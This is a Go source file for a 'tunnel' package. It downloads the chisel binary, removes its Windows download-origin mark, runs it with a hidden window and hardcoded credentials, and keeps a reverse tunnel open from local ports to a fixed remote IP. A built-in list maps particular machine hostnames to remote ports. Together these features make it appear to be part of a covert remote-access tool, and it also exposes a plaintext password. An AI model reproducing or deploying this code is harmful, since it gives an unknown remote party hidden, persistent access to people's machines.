package tunnel

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const chiselDownloadURL = "https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_windows_amd64.zip"
const chiselServerAddr = "45.32.121.103:7100"
const chiselAuth = "sekret:83kFmP9qR2vL7xN4"

type ChiselTunnel struct {
	localPort   int
	serviceName string
	url         string
	stopCh      chan struct{}
	onConnected func(url string)
	binDir      string
	running     bool
	mu          sync.Mutex
	serverAddr  string
	remotePort  int
}

func NewChisel(localPort int, shareName string, onConnected func(url string)) *ChiselTunnel {
	sanitized := strings.ToLower(shareName)
	sanitized = strings.NewReplacer("_", "-", ".", "-", " ", "-").Replace(sanitized)
	var clean strings.Builder
	for _, r := range sanitized {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-' {
			clean.WriteRune(r)
		}
	}
	sanitized = strings.Trim(clean.String(), "-")
	if len(sanitized) < 2 {
		sanitized = "machine"
	}
	log.Printf("[chisel] service name: '%s' (from hostname: '%s')", sanitized, shareName)
	return &ChiselTunnel{
		localPort:   localPort,
		serviceName: sanitized,
		stopCh:      make(chan struct{}),
		onConnected: onConnected,
		serverAddr:  chiselServerAddr,
		remotePort:  getChiselPort(sanitized),
	}
}

func getChiselPort(name string) int {
	m := map[string]int{
		"desktop-inj3o0l": 7081,
		"desktop-s43ukd6": 7082,
		"usermic-m3sii9l": 7083,
		"desktop-ba967g1": 7084,
		"sandokan":        7085,
	}
	if p, ok := m[name]; ok {
		return p
	}
	return 7081
}

func (t *ChiselTunnel) download() error {
	t.binDir = filepath.Join(os.TempDir(), "daljinac-chisel")
	os.MkdirAll(t.binDir, 0755)
	binPath := filepath.Join(t.binDir, "chisel.exe")

	if fi, err := os.Stat(binPath); err == nil {
		if fi.Size() > 1000000 {
			log.Printf("[chisel] binary already exists at %s (%d bytes)", binPath, fi.Size())
			return nil
		}
		log.Printf("[chisel] stale binary (%d bytes), re-downloading", fi.Size())
		os.Remove(binPath)
	}

	log.Printf("[chisel] downloading from %s", chiselDownloadURL)
	client := &http.Client{Timeout: 300 * time.Second}
	resp, err := client.Get(chiselDownloadURL)
	if err != nil {
		return fmt.Errorf("download failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("download HTTP %d", resp.StatusCode)
	}

	zipPath := filepath.Join(t.binDir, "chisel.zip")
	out, err := os.Create(zipPath)
	if err != nil {
		return fmt.Errorf("create zip: %w", err)
	}
	written, _ := io.Copy(out, resp.Body)
	out.Close()
	log.Printf("[chisel] downloaded %d bytes", written)

	log.Printf("[chisel] extracting chisel.exe...")
	zipReader, err := zip.OpenReader(zipPath)
	if err != nil {
		return fmt.Errorf("open zip: %w", err)
	}
	defer zipReader.Close()
	extracted := false
	for _, f := range zipReader.File {
		if strings.EqualFold(f.Name, "chisel.exe") {
			rc, err := f.Open()
			if err != nil {
				return fmt.Errorf("open %s in zip: %w", f.Name, err)
			}
			outFile, err := os.Create(binPath)
			if err != nil {
				rc.Close()
				return fmt.Errorf("create %s: %w", binPath, err)
			}
			_, err = io.Copy(outFile, rc)
			rc.Close()
			outFile.Close()
			if err != nil {
				return fmt.Errorf("extract %s: %w", f.Name, err)
			}
			extracted = true
			break
		}
	}
	if !extracted {
		return fmt.Errorf("chisel.exe not found in zip")
	}

	os.Remove(binPath + ":Zone.Identifier")

	if _, err := os.Stat(binPath); err != nil {
		return fmt.Errorf("binary not found after extract: %w", err)
	}
	log.Printf("[chisel] downloaded and extracted OK to %s", binPath)
	return nil
}

func (t *ChiselTunnel) Start() {
	log.Printf("[chisel] Start() called")
	t.mu.Lock()
	t.running = true
	t.mu.Unlock()
	go t.Run()
}

func (t *ChiselTunnel) Run() {
	defer func() {
		if r := recover(); r != nil {
			buf := make([]byte, 4096)
			n := runtime.Stack(buf, true)
			log.Printf("[chisel] PANIC: %v\n%s", r, buf[:n])
		}
	}()

	log.Printf("[chisel] Run() starting")

	if err := t.download(); err != nil {
		log.Printf("[chisel] download error: %v", err)
		return
	}

	t.running = true
	delay := 2 * time.Second

	for {
		select {
		case <-t.stopCh:
			t.mu.Lock()
			t.running = false
			t.mu.Unlock()
			log.Printf("[chisel] stopped by signal")
			return
		default:
		}

		log.Printf("[chisel] connecting (delay=%v)...", delay)
		t.connect()

		t.mu.Lock()
		isRunning := t.running
		t.mu.Unlock()
		if !isRunning {
			return
		}

		select {
		case <-t.stopCh:
			t.mu.Lock()
			t.running = false
			t.mu.Unlock()
			return
		case <-time.After(delay):
		}
		delay = min(delay*2, 60*time.Second)
	}
}

func (t *ChiselTunnel) connect() {
	binPath := filepath.Join(t.binDir, "chisel.exe")
	remote := fmt.Sprintf("R:%d:127.0.0.1:%d", t.remotePort, t.localPort)

	log.Printf("[chisel] starting: chisel client --auth ... %s %s", t.serverAddr, remote)
	cmd := exec.Command(binPath, "client", "--auth", chiselAuth, t.serverAddr, remote)
	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[chisel] StdoutPipe error: %v", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Printf("[chisel] StderrPipe error: %v", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("[chisel] start error: %v", err)
		return
	}
	log.Printf("[chisel] process started (pid=%d)", cmd.Process.Pid)

	var wg sync.WaitGroup
	var stdoutBuf, stderrBuf bytes.Buffer
	wg.Add(2)
	go func() {
		io.Copy(&stdoutBuf, stdout)
		wg.Done()
	}()
	go func() {
		io.Copy(&stderrBuf, stderr)
		wg.Done()
	}()

	done := make(chan struct{})
	go func() {
		cmd.Wait()
		close(done)
	}()

	t.mu.Lock()
	t.url = fmt.Sprintf("http://45.32.121.103:%d", t.remotePort)
	t.mu.Unlock()
	log.Printf("[chisel] URL: %s", t.url)
	if t.onConnected != nil {
		t.onConnected(t.url)
	}

	select {
	case <-done:
		log.Printf("[chisel] process exited")
		wg.Wait()
		if out := strings.TrimSpace(stdoutBuf.String()); out != "" {
			log.Printf("[chisel stdout] %s", out)
		}
		if out := strings.TrimSpace(stderrBuf.String()); out != "" {
			log.Printf("[chisel stderr] %s", out)
		}
	case <-t.stopCh:
		cmd.Process.Kill()
		log.Printf("[chisel] process killed")
	}
}

func (t *ChiselTunnel) Stop() {
	t.mu.Lock()
	t.running = false
	t.mu.Unlock()
	close(t.stopCh)
}

func (t *ChiselTunnel) URL() string {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.url
}

func (t *ChiselTunnel) IsRunning() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.running
}
